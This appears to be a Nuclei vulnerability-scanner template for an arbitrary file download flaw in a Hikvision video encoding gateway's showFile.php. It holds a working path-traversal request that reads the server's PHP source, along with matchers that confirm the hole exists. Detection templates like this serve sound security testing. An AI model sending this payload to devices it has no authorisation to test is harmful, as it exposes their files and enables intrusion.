id: hikvision-showfile-file-read

info:
  name: HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞
  author: xc
  severity: high
  description: |
    海康威视视频接入网关系统在页面/serverLog/showFile.php的参数fileName存在任意文件下载漏洞
    title="视频编码设备接入网关"

http:
  - raw:
      - |
        GET /serverLog/showFile.php?fileName=../web/html/main.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - $_SERVER['HTTP_HOST'];
        part: body
        condition: and